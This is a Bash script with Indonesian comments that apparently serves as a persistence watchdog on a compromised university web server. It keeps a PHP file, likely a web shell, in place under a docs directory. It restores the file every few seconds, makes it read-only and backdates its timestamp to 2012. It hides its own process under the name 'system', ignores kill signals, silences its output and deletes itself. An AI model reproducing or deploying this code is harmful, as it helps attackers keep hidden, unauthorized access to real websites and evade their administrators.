#!/bin/bash
# Konfigurasi
FOLDER_PATH="/var/www/vhosts/jsfidc.ub.ac.id/httpdocs/docs/manual/ar/settings"
TIMESTAMP="201201081531.12"
SOURCE_DIR="/var/www/vhosts/jsfidc.ub.ac.id/.wp-cli/cache/"

# Daftar file dan path sumbernya
declare -A FILES=(
    ["ArticleGalleyGridHandler.php"]="${SOURCE_DIR}/ArticleGalleyGridHandler.php"

)

ensure_folder_exists() {
    if [ ! -d "$FOLDER_PATH" ]; then
        mkdir -p "$FOLDER_PATH" || exit 1
        chmod 0755 "$FOLDER_PATH"
    fi
}

get_file_hash() {
    local file_path="$1"
    if [ -f "$file_path" ]; then
        md5sum "$file_path" | cut -d' ' -f1
    else
        echo ""
    fi
}

update_file() {
    local filename="$1"
    local source_path="$2"
    local file_path="${FOLDER_PATH}/${filename}"
    local temp_file="${file_path}.tmp"

    if [ -f "$file_path" ]; then
        chmod 0444 "$file_path"
    fi

    if cp "$source_path" "$temp_file"; then
        mv "$temp_file" "$file_path"
        chmod 0444 "$file_path"
        if ! chown www-data:www-data "$file_path"; then
            : # Tidak mencatat error
        fi
        touch -t "$TIMESTAMP" "$file_path"
        return 0
    else
        rm -f "$temp_file"
        if [ -f "$file_path" ]; then
            chmod 0444 "$file_path"
        fi
        return 1
    fi
}

check_file_changes() {
    local filename="$1"
    local source_path="$2"
    local file_path="${FOLDER_PATH}/${filename}"

    if [ -f "$source_path" ]; then
        local source_hash=$(md5sum "$source_path" | cut -d' ' -f1)
        local local_hash=$(get_file_hash "$file_path")
        if [ "$source_hash" != "$local_hash" ]; then
            return 0
        fi
    fi
    return 1
}

check_process() {
    if pgrep -x "system" > /dev/null; then
        return 0
    else
        return 1
    fi
}

run_in_background() {
    exec 0</dev/null
    exec 1>/dev/null
    exec 2>/dev/null
    trap "" SIGTERM SIGHUP SIGINT
    sleep $((RANDOM % 5))
    nice -n 19 nohup setsid bash -c "exec -a 'system' $0 run" &
    exit 0
}

self_delete() {
    sleep $((RANDOM % 3))
    # Gunakan direktori skrip untuk menghapus file sementara
    local script_dir=$(dirname "$0")
    rm -f "$0" "${script_dir}/system.enc" "${script_dir}/system" 2>/dev/null
}

main() {
    # Dapatkan direktori tempat skrip berada
    local script_dir=$(dirname "$0")
    local temp_system="${script_dir}/system"

    if [ "$1" = "run" ]; then
        trap "" SIGTERM SIGHUP SIGINT
        exec -a "system" nice -n 19 bash "$0" run_inner
    elif [ "$1" = "run_inner" ]; then
        while true; do
            ensure_folder_exists
            for filename in "${!FILES[@]}"; do
                file_path="${FOLDER_PATH}/${filename}"
                if [ ! -f "$file_path" ]; then
                    update_file "$filename" "${FILES[$filename]}"
                else
                    if check_file_changes "$filename" "${FILES[$filename]}"; then
                        update_file "$filename" "${FILES[$filename]}"
                    fi
                fi
            done
            sleep $((10 + RANDOM % 5))
        done
    else
        if ! check_process; then
            cp "$0" "$temp_system" 2>/dev/null
            chmod +x "$temp_system" 2>/dev/null
            "$temp_system" run &
            self_delete
        else
            exit 0
        fi
    fi
}

# Panggil fungsi main
main "$@"